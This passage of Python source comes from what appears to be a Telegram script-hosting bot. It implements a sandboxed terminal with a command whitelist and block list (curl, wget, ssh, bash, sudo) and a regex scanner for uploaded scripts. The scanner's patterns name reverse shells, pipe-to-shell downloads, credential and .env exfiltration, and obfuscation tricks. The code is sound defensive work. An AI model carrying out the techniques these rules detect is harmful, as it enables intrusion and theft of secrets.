                    f"<i>Tip: only safe subcommands are permitted (e.g. <code>pip install</code>, <code>npm list</code>).</i>"
                )

    # 6. Not in whitelist at all
    return False, (
        f"🚫 <code>{_esc(base)}</code> is not an allowed command.\n\n"
        f"✅ <b>Allowed:</b> <code>python</code> · <code>pip</code> · <code>node</code> · "
        f"<code>npm</code> · <code>cat</code> · <code>ls</code> · <code>grep</code> · "
        f"<code>head</code> · <code>tail</code> · <code>echo</code> · <code>find</code> · "
        f"<code>env</code> · <code>ps</code> · <code>df</code> · <code>free</code> · <code>uptime</code>\n\n"
        f"🚫 <b>Permanently blocked:</b> <code>rm</code> · <code>mv</code> · <code>cp</code> · "
        f"<code>curl</code> · <code>wget</code> · <code>ssh</code> · <code>scp</code> · "
        f"<code>bash</code> · <code>sh</code> · <code>neofetch</code> · <code>chmod</code> · "
        f"<code>kill</code> · <code>sudo</code> and many more."
    )


def _sandbox_ls(cmd: str, user_id: int, base_dir: str = None) -> tuple:
    """Custom ls handler that always scopes to the user's sandbox (or current terminal cwd)."""
    user_folder = get_user_folder(user_id)
    base = base_dir if (base_dir and _path_in_sandbox(base_dir, user_folder)) else user_folder
    parts = cmd.strip().split()
    if not parts or parts[0] not in ('ls',):
        return False, ""
    target = base
    if len(parts) > 1:
        last = parts[-1]
        if not last.startswith('-'):
            candidate = os.path.normpath(os.path.join(base, last))
            if not _path_in_sandbox(candidate, user_folder):
                return True, "🚫 Access denied: you can only browse your own directory."
            target = candidate
    try:
        entries = sorted(os.listdir(target))
        if not entries:
            return True, "(directory is empty)"
        lines = []
        for e in entries:
            full = os.path.join(target, e)
            if os.path.isdir(full):
                lines.append(f"📁 {e}/")
            else:
                size = os.path.getsize(full)
                lines.append(f"📄 {e}  ({'%.1fK' % (size/1024) if size >= 1024 else str(size)+'B'})")
        return True, f"📂 ~\n" + "\n".join(lines)
    except Exception as e:
        return True, f"❌ {e}"


def _get_terminal_cwd(user_id: int) -> str:
    """Returns the current terminal working directory for a user's session,
    always guaranteed to be inside their sandbox folder."""
    user_folder = get_user_folder(user_id)
    sess = terminal_sessions.get(user_id)
    cwd = sess.get('cwd') if sess else None
    if not cwd or not _path_in_sandbox(cwd, user_folder):
        cwd = user_folder
    return cwd

def _sandbox_cd(cmd: str, user_id: int) -> tuple:
    """
    Custom 'cd' handler — never escapes the user's own main sandbox dir.
    Returns (intercepted: bool, message: str).
    """
    user_folder = get_user_folder(user_id)
    parts = cmd.strip().split(maxsplit=1)
    if not parts or parts[0] != 'cd':
        return False, ""

    current = _get_terminal_cwd(user_id)
    dest_arg = parts[1].strip() if len(parts) > 1 else ""

    if not dest_arg or dest_arg in ('~', '/'):
        target = user_folder
    else:
        target = os.path.normpath(os.path.join(current, dest_arg))

    if not _path_in_sandbox(target, user_folder):
        return True, "🚫 You can't leave your own directory."
    if not os.path.isdir(target):
        rel = os.path.relpath(target, user_folder)
        return True, f"❌ No such directory: <code>{_esc(rel)}</code>"

    terminal_sessions.setdefault(user_id, {})['cwd'] = target
    rel_display = os.path.relpath(target, user_folder)
    rel_display = "~" if rel_display == "." else f"~/{rel_display}"
    return True, f"📂 Now in <code>{_esc(rel_display)}</code>"


def _run_terminal_command(cmd: str, chat_id: int, user_id: int):
    user_folder = get_user_folder(user_id)
    current_cwd = _get_terminal_cwd(user_id)
    header      = f"💻 <b>Terminal</b> — <code>{_esc(cmd[:80])}</code>\n"
    sep         = "─" * 30 + "\n"

    # Intercept cd ourselves (always sandboxed, never spawns a process)
    if cmd.strip() == 'cd' or cmd.strip().startswith('cd '):
        intercepted, cd_out = _sandbox_cd(cmd, user_id)
        if intercepted:
            bot.send_message(chat_id, f"{header}{sep}{cd_out}",
                             parse_mode='HTML', reply_markup=create_terminal_menu())
            _terminal_reprompt(chat_id, user_id)
            return

    # ── Rate limit terminal usage ───────────────────────────────────────
    allowed_rate, rate_reason = _check_action_rate(user_id, 'terminal_cmd')
    if not allowed_rate:
        bot.send_message(chat_id, f"{header}{sep}{rate_reason}", parse_mode='HTML',
                         reply_markup=create_terminal_menu())
        _terminal_reprompt(chat_id, user_id)
        return
    _record_action(user_id, 'terminal_cmd')

    # Intercept ls ourselves (always sandboxed)
    if cmd.strip().startswith('ls'):
        intercepted, ls_out = _sandbox_ls(cmd, user_id, base_dir=current_cwd)
        if intercepted:
            bot.send_message(chat_id, f"{header}{sep}<pre>{_esc(ls_out)}</pre>",
                             parse_mode='HTML', reply_markup=create_terminal_menu())
            _terminal_reprompt(chat_id, user_id)
            return

    # Full whitelist check
    allowed, reason = _terminal_check(cmd, user_id)
    if not allowed:
        bot.send_message(
            chat_id,
            f"{header}{sep}🛑 <b>Blocked</b>\n\n{reason}",
            parse_mode='HTML', reply_markup=create_terminal_menu()
        )
        _terminal_reprompt(chat_id, user_id)
        return

    # ── Sandbox: reject any argument that resolves outside the user folder ──
    try:
        cmd_list_check = shlex.split(cmd)
    except ValueError:
        cmd_list_check = []
    path_ok, path_reason = _check_arg_paths(cmd_list_check, user_folder)
    if not path_ok:
        bot.send_message(
            chat_id,
            f"{header}{sep}🚫 <b>Path sandbox violation</b>\n\n"
            f"<code>{_esc(path_reason)}</code>\n\n"
            f"<i>Terminal commands are restricted to your own directory.</i>",
            parse_mode='HTML', reply_markup=create_terminal_menu()
        )
        _terminal_reprompt(chat_id, user_id)
        return

    try:
        wait_msg = bot.send_message(
            chat_id, f"{header}{sep}<i>⏳ Running…</i>",
            parse_mode='HTML', reply_markup=create_terminal_menu()
        )
    except Exception as e:
        logger.error(f"Terminal send_message: {e}")
        return

    try:
        # ── SECURITY: shell=False prevents shell-injection bypasses ───────
        # Convert the validated command string to an argument list via shlex
        # so it goes directly to execve() with no /bin/sh interpretation.
        try:
            cmd_list = shlex.split(cmd)
        except ValueError as e:
            bot.send_message(chat_id,
                f"{header}{sep}❌ Command parse error: {_esc(str(e))}",
                parse_mode='HTML', reply_markup=create_terminal_menu())
            _terminal_reprompt(chat_id, user_id)
            return

        sandbox_env = {
            'HOME':  user_folder,
            'TMPDIR':user_folder,
            'PATH':  '/usr/local/bin:/usr/bin:/bin',
        }

        proc = subprocess.Popen(
            cmd_list,
            shell=False,          # ← was shell=True — CRITICAL FIX
            cwd=current_cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            text=True, encoding='utf-8', errors='replace', bufsize=1,
            env=sandbox_env
        )
    except Exception as e:
        try:
            bot.edit_message_text(
                f"{header}{sep}❌ Failed to start:\n<pre>{_esc(str(e))}</pre>",
                chat_id, wait_msg.message_id, parse_mode='HTML',
                reply_markup=create_terminal_menu()
            )
        except Exception:
            pass
        _terminal_reprompt(chat_id, user_id)
        return

    output_lines = []
    total_chars  = 0
    truncated    = False
    last_update  = time.time()
    start_time   = time.time()
    UPDATE_EVERY = 1.5
    FOREGROUND_STREAM_SECONDS = _TERMINAL_CMD_TIMEOUT

    proc_id = str(proc.pid)
    terminal_procs[proc_id] = {
        'process': proc, 'user_id': user_id, 'chat_id': chat_id,
        'cmd': cmd, 'started': datetime.now(),
    }

    # Give the Stop button immediately, in case the command hangs or is long-running
    try:
        bot.edit_message_text(
            f"{header}{sep}<i>⏳ Running…</i>",
            chat_id, wait_msg.message_id, parse_mode='HTML',
            reply_markup=_terminal_running_markup(proc_id)
        )
    except Exception:
        pass

    detached = False
    try:
        while True:
            if proc.poll() is not None:
                break
            if proc_id not in terminal_procs:
                # Stopped via the Stop button while we were reading
                break
            if time.time() - start_time > FOREGROUND_STREAM_SECONDS:
                detached = True
                break
            try:
                ready, _, _ = select.select([proc.stdout], [], [], 0.3)
            except (OSError, ValueError):
                break
            if ready:
                line = proc.stdout.readline()
                if not line:
                    break
                output_lines.append(line)
                total_chars += len(line)
                if total_chars > _TERMINAL_MAX_OUTPUT:
                    truncated = True
                    while total_chars > _TERMINAL_MAX_OUTPUT and output_lines:
                        removed = output_lines.pop(0)
                        total_chars -= len(removed)
            now = time.time()
            if now - last_update >= UPDATE_EVERY:
                snippet    = _esc("".join(output_lines))
                trunc_note = "\n<i>…(older output trimmed)</i>" if truncated else ""
                try:
                    bot.edit_message_text(
                        f"{header}{sep}<pre>{snippet}</pre>{trunc_note}\n<i>⏳ Running…</i>",
                        chat_id, wait_msg.message_id, parse_mode='HTML',
                        reply_markup=_terminal_running_markup(proc_id)
                    )
                except Exception:
                    pass
                last_update = time.time()
    except Exception as e:
        output_lines.append(f"\n⚠️ Stream error: {e}")

    if proc_id not in terminal_procs:
        # It was stopped via the Stop button — that handler already sent its own message.
        return

    if detached:
        # Still running after the foreground window — leave it alive in the background,
        # trackable/stoppable via the Processes panel instead of blocking this thread.
        snippet    = _esc("".join(output_lines)) if output_lines else "(no output yet)"
        trunc_note = "\n<i>…(older output trimmed)</i>" if truncated else ""
        final_text = (
            f"{header}{sep}<pre>{snippet}</pre>{trunc_note}\n"
            f"♾️ <b>Still running in background (PID {proc.pid}).</b>\n"
            f"Use 📟 Processes anytime to check on it or stop it."
        )
        try:
            bot.edit_message_text(final_text, chat_id, wait_msg.message_id,
                                  parse_mode='HTML', reply_markup=_terminal_running_markup(proc_id))
        except Exception:
            pass
        _terminal_reprompt(chat_id, user_id)
        return  # NOTE: intentionally leaving terminal_procs[proc_id] — process keeps running

    terminal_procs.pop(proc_id, None)
    rc        = proc.returncode if proc.returncode is not None else "?"
    exit_icon = "✅" if rc == 0 else "❌"
    snippet   = _esc("".join(output_lines)) if output_lines else "(no output)"
    trunc_note = "\n<i>…(output trimmed)</i>" if truncated else ""

    final_text = f"{header}{sep}<pre>{snippet}</pre>{trunc_note}\n{exit_icon} <b>Exit: {rc}</b>"
    if len(final_text) > 4050:
        final_text = f"{header}{sep}<pre>…\n{snippet[-(3000):]}</pre>\n<i>(truncated)</i>\n{exit_icon} <b>Exit: {rc}</b>"

    try:
        bot.edit_message_text(final_text, chat_id, wait_msg.message_id,
                              parse_mode='HTML', reply_markup=create_terminal_menu())
    except telebot.apihelper.ApiTelegramException as e:
        if "not modified" not in str(e).lower():
            try:
                bot.send_message(chat_id, final_text,
                                 parse_mode='HTML', reply_markup=create_terminal_menu())
            except Exception:
                pass

    _terminal_reprompt(chat_id, user_id)


def _cb_terminal_processes(call):
    user_id = call.from_user.id
    bot.answer_callback_query(call.id)
    mine = {pid: info for pid, info in terminal_procs.items()
            if info['user_id'] == user_id or user_id in admin_ids}

    if not mine:
        try:
            bot.send_message(call.message.chat.id, "📟 No background terminal processes running.",
                             reply_markup=create_terminal_menu())
        except Exception:
            pass
        _terminal_reprompt(call.message.chat.id, user_id)
        return

    lines = ["📟 <b>Running terminal processes:</b>\n"]
    mk = types.InlineKeyboardMarkup()
    for pid, info in mine.items():
        proc   = info['process']
        alive  = proc.poll() is None
        status = "🟢 running" if alive else "⚪ exited"
        elapsed = int((datetime.now() - info['started']).total_seconds())
        lines.append(f"<code>{_esc(info['cmd'][:40])}</code>\nPID {pid} — {status} — {elapsed}s\n")
        if alive:
            mk.row(_btn(f"🛑 Stop PID {pid}", "danger", f"term_kill_{pid}"))
        else:
            terminal_procs.pop(pid, None)  # cleanup stale entry

    mk.row(
        _btn("🔙 Back to Menu",   "gray",   "back_to_main"),
        _btn("❌ Close Terminal", "danger", "close_terminal"),
    )
    try:
        bot.send_message(call.message.chat.id, "\n".join(lines), parse_mode='HTML', reply_markup=mk)
    except Exception:
        pass
    _terminal_reprompt(call.message.chat.id, user_id)


def _cb_terminal_kill(call):
    try:
        proc_id   = call.data[len('term_kill_'):]
        info      = terminal_procs.get(proc_id)
        requester = call.from_user.id

        if not info:
            bot.answer_callback_query(call.id, "Already stopped.", show_alert=True)
            return
        if requester != info['user_id'] and requester not in admin_ids:
            bot.answer_callback_query(call.id, "Permission denied.", show_alert=True)
            return

        kill_process_tree({'process': info['process']})
        terminal_procs.pop(proc_id, None)
        bot.answer_callback_query(call.id, f"Stopped PID {proc_id}.")

        try:
            bot.edit_message_text(
                f"🛑 <b>Process PID {proc_id} stopped.</b>",
                call.message.chat.id, call.message.message_id,
                parse_mode='HTML', reply_markup=create_terminal_menu()
            )
        except telebot.apihelper.ApiTelegramException:
            pass
    except Exception as e:
        logger.error(f"_cb_terminal_kill: {e}", exc_info=True)
        bot.answer_callback_query(call.id, "Error stopping process.", show_alert=True)


def _terminal_reprompt(chat_id: int, user_id: int):
    try:
        cwd_now = _get_terminal_cwd(user_id)
        user_folder = get_user_folder(user_id)
        rel = os.path.relpath(cwd_now, user_folder)
        rel = "~" if rel == "." else f"~/{rel}"
        prompt = bot.send_message(
            chat_id,
            f"💻 <b>Terminal</b> (<code>{_esc(rel)}</code>) — Type next command or <code>exit</code> to close:",
            parse_mode='HTML', reply_markup=create_terminal_menu()
        )
        terminal_sessions[user_id] = {'chat_id': chat_id, 'active': True, 'cwd': cwd_now}
        bot.register_next_step_handler(prompt, _handle_terminal_input)
    except Exception:
        pass


def _handle_terminal_input(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    raw = (message.text or "").strip()

    if raw.lower() in ('/exit_terminal', '/exit', 'exit', 'quit', '/quit', 'close'):
        terminal_sessions.pop(user_id, None)
        bot.reply_to(message, "💻 Terminal session closed. Use /terminal to reopen.")
        return

    if not raw:
        prompt = bot.reply_to(message, "💻 Enter a command:")
        bot.register_next_step_handler(prompt, _handle_terminal_input)
        return

    threading.Thread(
        target=_run_terminal_command,
        args=(raw, chat_id, user_id),
        daemon=True
    ).start()

# ── SCRIPT SECURITY SCANNER ────────────────────────────────────────────────
# Scans uploaded .py and .js files for dangerous patterns before approval.

_SCAN_RULES = [
    # ── Filesystem destruction ─────────────────────────────────────────
    (re.compile(r'\brm\s*\(|os\.(remove|unlink|rmdir|removedirs)\s*\(|shutil\.rmtree\s*\(', re.I),
     "Filesystem deletion (os.remove / shutil.rmtree / rm)"),
    (re.compile(r'subprocess.*\brm\b|os\.system.*\brm\b', re.I),
     "Shell rm via subprocess/os.system"),
    (re.compile(r'subprocess.*(find\b.*-delete|find\b.*-exec\s+rm)', re.I),
     "find -delete / find -exec rm (mass file deletion)"),

    # ── Disk overwrite / fill ─────────────────────────────────────────
    (re.compile(r'subprocess.*\bdd\b.*of=/dev/', re.I),
     "dd writing to block device (disk wipe)"),
    (re.compile(r'subprocess.*\bfallocate\b|os\.system.*\bfallocate\b', re.I),
     "fallocate — disk fill / denial of service"),
    (re.compile(r'open\s*\(\s*[\'"]/dev/(sd[a-z]|vd[a-z]|nvme|hd[a-z])', re.I),
     "Direct write to block device via open()"),
    (re.compile(r'subprocess.*(mkfs|fdisk|parted|gdisk)\b', re.I),
     "Disk formatting via subprocess"),

    # ── Memory / CPU exhaustion ───────────────────────────────────────
    (re.compile(r'while\s+(True|1)\s*:\s*\n?\s*(a\s*[\+\.]?=|.*append\s*\()', re.I),
     "Potential memory exhaustion loop (infinite list growth)"),
    (re.compile(r'subprocess.*(yes\s*>|yes\s+/dev/null)', re.I),
     "yes > /dev/null — CPU exhaustion"),
    (re.compile(r'multiprocessing\.Process.*while\s+True', re.I | re.S),
     "Forking infinite processes — fork bomb risk"),
    (re.compile(r'threading\.Thread.*while\s+True.*daemon\s*=\s*False', re.I | re.S),
     "Spawning unlimited non-daemon threads"),

    # ── Fork bomb patterns ────────────────────────────────────────────
    (re.compile(r'os\.fork\s*\(\s*\)', re.I),
     "os.fork() — potential fork bomb"),
    (re.compile(r'subprocess.*\bnohup\b|subprocess.*\bdisown\b', re.I),
     "Detaching background processes (persistence/fork risk)"),

    # ── File movement / staging (exfil prep — shell only, shutil allowed) ──
    (re.compile(r'subprocess.*(\'|\")mv\s|os\.system.*\'mv\s|os\.system.*\"mv\s', re.I),
     "Shell mv via subprocess — file staging risk"),
    (re.compile(r'subprocess.*(\'|\")cp\s|os\.system.*\'cp\s|os\.system.*\"cp\s', re.I),
     "Shell cp via subprocess — file copy risk"),

    # ── Data exfiltration via HTTP ─────────────────────────────────────
    (re.compile(r'(requests|httpx|aiohttp|urllib)\.(get|post|put|delete|patch|request)\s*\(.*?(token|password|passwd|secret|key|cookie|session|credential)', re.I | re.S),
     "Possible credential/data exfiltration via HTTP"),
    (re.compile(r'(requests|httpx|aiohttp)\.(post|put)\s*\(.*?files\s*=', re.I | re.S),
     "HTTP multipart file upload — possible data exfiltration"),
    (re.compile(r'(requests|httpx|aiohttp)\.(post|put)\s*\(.*?open\s*\(', re.I | re.S),
     "Uploading local file contents via HTTP (exfil pattern)"),
    (re.compile(r'(requests|httpx|aiohttp)\.(post|put|get)\s*\(.*?os\.environ', re.I | re.S),
     "Sending environment variables to external server"),

    # ── Raw network exfil ─────────────────────────────────────────────
    (re.compile(r'(socket\.connect|socket\.create_connection)\s*\(', re.I),
     "Raw socket outbound connection"),
    (re.compile(r'socket\..*\.(sendall|send|sendto)\s*\(', re.I),
     "Raw socket data send — possible exfiltration"),
    (re.compile(r'ftplib|smtplib|imaplib|poplib', re.I),
     "Network protocol lib that can exfiltrate data (ftp/smtp/imap)"),
    (re.compile(r'paramiko|fabric|asyncssh', re.I),
     "SSH library (can be used for remote exfil)"),

    # ── Process / system control ──────────────────────────────────────
    (re.compile(r'(wget|curl)\b[^\n]{0,200}\|\s*(sh|bash|zsh)\b', re.I),
     "Pipe-to-shell download (curl/wget | bash) — remote code execution pattern"),
    (re.compile(r'chattr\s+\+i\b', re.I),
     "chattr +i — making files immutable (persistence/anti-removal)"),
    (re.compile(r'subprocess.*(kill\b|killall\b|pkill\b)', re.I),
     "Killing processes via subprocess"),
    (re.compile(r'subprocess.*(shutdown|reboot|halt|poweroff|init\s+[0-6])', re.I),
     "System shutdown/reboot via subprocess"),
    (re.compile(r'subprocess.*(iptables|ufw|nft|ip6tables)\b', re.I),
     "Firewall manipulation via subprocess"),
    (re.compile(r'subprocess.*(ip\s+link\s+set|ifconfig\b.*down)', re.I),
     "Network interface manipulation — firewall/network lockout risk"),
    (re.compile(r'subprocess.*sysctl\b', re.I),
     "sysctl via subprocess — kernel parameter manipulation"),

    # ── System recon / fingerprinting ─────────────────────────────────
    (re.compile(r'open\s*\(\s*[\'"]/proc/(net|self|cpuinfo|meminfo|version|uptime|mounts)', re.I),
     "Reading /proc system internals (system fingerprinting)"),
    (re.compile(r'subprocess.*(neofetch|screenfetch|inxi|lshw|lscpu|lspci|dmidecode)\b', re.I),
     "System fingerprinting tool via subprocess"),
    (re.compile(r'subprocess.*(ifconfig|netstat|ss\s+-|lsof)\b', re.I),
     "Network reconnaissance via subprocess"),

    # ── Environment / token harvesting ────────────────────────────────
    (re.compile(r'os\.environ\b.*?(token|password|secret|key|api_key|bot_token)', re.I),
     "Reading sensitive environment variables"),
    (re.compile(r'os\.environ\b.*?(send|post|upload|write|dump)', re.I | re.S),
     "Exfiltrating environment variables to external destination"),
    (re.compile(r'open\s*\(\s*[\'\"]/etc/(passwd|shadow|sudoers|hosts|crontab|fstab)', re.I),
     "Reading sensitive system files (/etc/passwd etc.)"),
    (re.compile(r'open\s*\(\s*[\'\"]\.env[\'\"]', re.I),
     "Reading .env file (token harvesting risk)"),

    # ── Mass file reading / dumping ───────────────────────────────────
    (re.compile(r'os\.walk\s*\(', re.I),
     "Recursive filesystem walk — possible mass file reading"),
    (re.compile(r'glob\.(glob|iglob)\s*\(.*\*', re.I),
     "Wildcard file glob — possible mass file collection"),

    # ── Code execution tricks ──────────────────────────────────────────
    (re.compile(r'\beval\s*\(|exec\s*\(compile\s*\(', re.I),
     "Dynamic code execution (eval/exec+compile)"),
    (re.compile(r'__import__\s*\(\s*[\'"]os[\'"]\s*\)', re.I),
     "Hidden os import via __import__"),
    (re.compile(r'base64\.b64decode.*exec|exec.*base64\.b64decode', re.I | re.S),
     "Base64-encoded payload execution"),
    (re.compile(r'marshal\.loads|pickle\.loads|dill\.loads', re.I),
     "Deserialization of arbitrary code (pickle/marshal/dill)"),

    # ── OBFUSCATION DETECTION ─────────────────────────────────────────
    # GAP 1 — `import os as <alias>`: scanner matched `os.walk(` literally,
    # so `import os as hi` → `hi.walk()` was invisible to every existing rule.
    (re.compile(r'\bimport\s+(os|sys|subprocess|shutil|glob|pathlib|importlib|signal|ctypes)\s+as\s+\w+', re.I),
     "Dangerous module aliased on import (e.g. import os as hi) — obfuscation"),

    # GAP 2 — dynamic `__import__(variable)`: old rule only caught the
    # literal string form `__import__('os')`. A loop like
    # `for pkg, items in _imports: __import__(pkg, ...)` went undetected.
    (re.compile(r'__import__\s*\(\s*\w', re.I),
     "Dynamic __import__() call with variable argument — obfuscation"),

    # GAP 3 — `globals()[key] = value`: scripts inject module functions
    # into the global namespace without a visible import statement.
    (re.compile(r'globals\s*\(\s*\)\s*\[', re.I),
     "globals() dict injection — dynamic symbol injection (obfuscation)"),

    # GAP 4 — obfuscated builtins: assigning `getattr`/`setattr`/`exec`
    # to short underscore names to hide later usage.
    (re.compile(r'^\s*_{1,3}\s*=\s*(getattr|setattr|hasattr|delattr|exec|eval|compile)\b', re.I | re.M),
     "Builtin aliased to underscore variable (obfuscation)"),

    # GAP 5 — hardcoded Telegram bot token embedded in the script.
    # A script with its own token can act as a C2 / RAT independently.
    (re.compile(r'\b\d{8,10}:AA[A-Za-z0-9_\-]{35}\b'),
     "Hardcoded Telegram bot token (embedded C2 / RAT backdoor)"),

    # GAP 6 — `getattr(module, 'system')` style calls that bypass
    # name-based rules by looking up dangerous functions by string.
    (re.compile(r'getattr\s*\(\s*\w+\s*,\s*[\'\"](system|popen|walk|listdir|getcwd|environ|remove|unlink|fork|execv|spawn)[\'\"]\s*\)', re.I),
     "getattr() used to invoke dangerous function by string (obfuscation)"),

    # ── Privilege / system manipulation ───────────────────────────────
    (re.compile(r'os\.(setuid|setgid|seteuid|setegid)\s*\(', re.I),
     "Privilege escalation via os.setuid/setgid"),
    (re.compile(r'os\.fork\s*\(\s*\)', re.I),
     "os.fork() — fork bomb or persistent backdoor"),
    (re.compile(r'subprocess.*\b(chmod|chown|sudo|su|bash|sh)\b', re.I),
     "Spawning privileged shell commands"),
    (re.compile(r'ctypes\.cdll|ctypes\.CDLL|cffi\.FFI', re.I),
     "Low-level C library access (ctypes/cffi)"),

    # ── Crypto miners ─────────────────────────────────────────────────
    (re.compile(r'(xmrig|minerd|cryptonight|stratum\+tcp|monero\.pool)', re.I),
     "Cryptocurrency miner signature"),

    # ── Reverse shells ────────────────────────────────────────────────
    (re.compile(r'socket.*SOCK_STREAM.*connect.*\d+\.\d+\.\d+\.\d+', re.I | re.S),
     "Potential reverse shell (socket + IP connection)"),
    (re.compile(r'pty\.spawn|pty\.openpty.*bash|subprocess.*shell=True.*stdin=PIPE.*stdout=PIPE', re.I),
     "Potential interactive shell spawn"),

    # ── JS specific ───────────────────────────────────────────────────
    (re.compile(r'require\s*\(\s*[\'"]child_process[\'"]\s*\).*exec\s*\(', re.I | re.S),
     "JS child_process.exec (shell injection risk)"),
    (re.compile(r'fs\.(unlink|rmdir|rm)\s*\(', re.I),
     "JS filesystem deletion (fs.unlink/rmdir)"),
    (re.compile(r'fs\.(rename|copyFile|cp)\s*\(', re.I),
     "JS file move/copy — staging for exfil"),
    (re.compile(r'process\.env\.(TOKEN|PASSWORD|SECRET|API_KEY|BOT_TOKEN)', re.I),
     "JS reading sensitive env vars"),
    (re.compile(r'require\s*\(\s*[\'"]net[\'"]\s*\).*connect\s*\(', re.I | re.S),
     "JS raw socket connection (exfil/reverse shell risk)"),
    (re.compile(r'require\s*\(\s*[\'"]https?[\'"]\s*\).*\.(post|put)\s*\(', re.I | re.S),
     "JS outbound HTTP POST — possible data exfiltration"),
    (re.compile(r'while\s*\(true\)\s*\{[^}]*\}', re.I),
     "JS infinite loop — CPU/memory exhaustion risk"),
]

_SCAN_WARN_RULES = [
    # Lower severity — warn but don't block (admin sees these)
    (re.compile(r'\beval\s*\(', re.I),
     "eval() — can execute arbitrary code"),
    (re.compile(r'subprocess\.(run|Popen|call|check_output)\s*\(.*shell\s*=\s*True', re.I),
     "subprocess with shell=True — shell injection risk"),
    (re.compile(r'open\s*\(.*[\'\"](w|a|wb|ab)[\'\"]', re.I),
     "File write/create operation"),
    (re.compile(r'(requests|httpx|aiohttp|urllib).*\.(get|post)\s*\(', re.I),
     "Outbound HTTP request"),
    # ── File creation / management (allowed in sandbox, but admin is notified) ──
    (re.compile(r'shutil\.(copy|copy2|copytree|move)\s*\(', re.I),
     "File copy/move via shutil (allowed inside sandbox)"),
    (re.compile(r'zipfile\.(ZipFile|write)', re.I),
     "Creating/writing zip archive"),
    (re.compile(r'os\.walk\s*\(', re.I),
     "Recursive directory walk (os.walk)"),
    (re.compile(r'glob\.(glob|iglob)\s*\(.*\*', re.I),
     "Wildcard file glob"),
    # ── JS file creation ──────────────────────────────────────────────
    (re.compile(r'fs\.(writeFile|writeFileSync|createWriteStream|appendFile)\s*\(', re.I),
     "JS file write/create operation"),
    (re.compile(r'fs\.(mkdir|mkdirSync)\s*\(', re.I),
     "JS directory creation"),
]

# ── Legitimate file names that bots commonly create/read ─────────────────────
# Warnings triggered by these file names are suppressed (they are normal bot files).
_LEGITIMATE_FILE_PATTERNS = re.compile(
    r'(token\.json|credentials\.json|session\.json|auth\.json|config\.json|'
    r'settings\.json|data\.json|db\.json|users\.json|'
    r'\.token|\.session|\.credential|\.pickle|\.pkl|'
    r'session_string|pyrogram\.session|telethon\.session)',
    re.I
)

def scan_script_for_threats(code: str, filename: str) -> dict:
    """
    Scan code string for malicious patterns.
    Respects _disabled_scan_labels — rules whose label is in that set are skipped.
    Returns {
      'blocked': bool,
      'threats': list of str,   # critical — block
      'warnings': list of str,  # suspicious — warn admin
      'clean': bool,
    }
    """
    threats  = []
    warnings = []

    for pattern, label in _SCAN_RULES:
        if label in _disabled_scan_labels:
            continue
        if pattern.search(code):
            threats.append(label)

    for pattern, label in _SCAN_WARN_RULES:
        if label in _disabled_scan_labels:
            continue
        if pattern.search(code):
            # Don't double-count things already in threats
            if not any(label in t for t in threats):
                # Suppress "File write/create" warning if it's on a known-legitimate filename
                if label == "File write/create operation" and _LEGITIMATE_FILE_PATTERNS.search(code):
                    continue
                warnings.append(label)

    return {
        'blocked':  len(threats) > 0,
        'threats':  threats,
        'warnings': warnings,
        'clean':    len(threats) == 0 and len(warnings) == 0,
    }

def _read_script_content(file_path: str) -> str | None:
    """Read text content of a script file safely."""
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read(500_000)   # max 500KB of text
    except Exception:
        return None

# ── Process sandbox helpers ───────────────────────────────────────────────────

def _build_sandbox_env(user_folder: str) -> dict:
    """
    Build a tightly restricted environment for user script / terminal processes.
    Blocks: HOME escaping, TMPDIR escaping, PATH expansion, PYTHONPATH injection,
    NODE_PATH injection, and XDG dirs pointing outside the sandbox.
    """
    abs_folder = os.path.abspath(user_folder)
    return {
        # Identity / locale — harmless but required for many scripts
        'LANG': 'en_US.UTF-8',
        'LC_ALL': 'en_US.UTF-8',
        'TZ': 'UTC',
        # Restrict all writable temp and home paths to the user folder
        'HOME':     abs_folder,
        'TMPDIR':   abs_folder,
        'TEMP':     abs_folder,
        'TMP':      abs_folder,
        # Python-specific locks
        'PYTHONNOUSERSITE': '1',      # ignore ~/.local/lib
        'PYTHONPATH':       '',        # no external module injection
        'PYTHONDONTWRITEBYTECODE': '1',
        'PYTHONUNBUFFERED': '1',
        # Node-specific locks
        'NODE_PATH': abs_folder,
        'NPM_CONFIG_PREFIX': abs_folder,
        # XDG dirs — keep inside sandbox
        'XDG_DATA_HOME':   abs_folder,
        'XDG_CONFIG_HOME': abs_folder,
        'XDG_CACHE_HOME':  abs_folder,
        'XDG_RUNTIME_DIR': abs_folder,
        # Minimal safe PATH — no user-writable bin dirs
        'PATH': '/usr/local/bin:/usr/bin:/bin',
    }

def _is_path_inside_sandbox(path: str, sandbox: str) -> bool:
    """Return True if `path` resolves to somewhere inside `sandbox`."""
    try:
        return os.path.abspath(path).startswith(os.path.abspath(sandbox) + os.sep) \
               or os.path.abspath(path) == os.path.abspath(sandbox)
    except Exception:
        return False

def _check_arg_paths(args: list, user_folder: str) -> tuple[bool, str]:
    """
    Scan a subprocess argument list for absolute paths that escape the sandbox.
    Returns (safe: bool, reason: str).
    """
    abs_sandbox = os.path.abspath(user_folder)
    for arg in args:
        if not isinstance(arg, str):
            continue
        # Flag any argument that looks like an absolute path escaping the sandbox
        if arg.startswith('/') and not arg.startswith(abs_sandbox):
            # Allow whitelisted system binaries/libs
            if any(arg.startswith(pfx) for pfx in (
                '/usr/local/bin/', '/usr/bin/', '/bin/',
                '/usr/lib/', '/lib/', '/usr/local/lib/',
            )):
                continue
            return False, f"Path argument escapes sandbox: {arg[:80]}"
    return True, ""

def _format_scan_result(result: dict, filename: str) -> str:
    if result['clean']:
        return f"✅ <b>Scan clean:</b> <code>{_esc(filename)}</code> — no threats detected."

    lines = [f"🔍 <b>Security Scan:</b> <code>{_esc(filename)}</code>\n"]

    if result['threats']:
        lines.append(f"🚨 <b>{len(result['threats'])} Critical threat(s) found:</b>")
        for t in result['threats']:
            lines.append(f"  • {_esc(t)}")

    if result['warnings']:
        lines.append(f"\n⚠️ <b>{len(result['warnings'])} Warning(s):</b>")
        for w in result['warnings']:
            lines.append(f"  • {_esc(w)}")

    return "\n".join(lines)

# ── Upgrade 4: Upload rate limiting ──────────────────────────────────────────

def _check_upload_rate(user_id: int) -> tuple[bool, str]:
    """
    Returns (allowed: bool, reason: str).
    Enforces per-hour upload caps: free=3, premium=10, admin=unlimited.
    """
    if user_id in admin_ids:
        return True, ""

    now    = datetime.now()
    cutoff = now - timedelta(seconds=UPLOAD_RATE_WINDOW)
    times  = _upload_timestamps.get(user_id, [])
    # Prune old timestamps
    times  = [t for t in times if t > cutoff]
    _upload_timestamps[user_id] = times

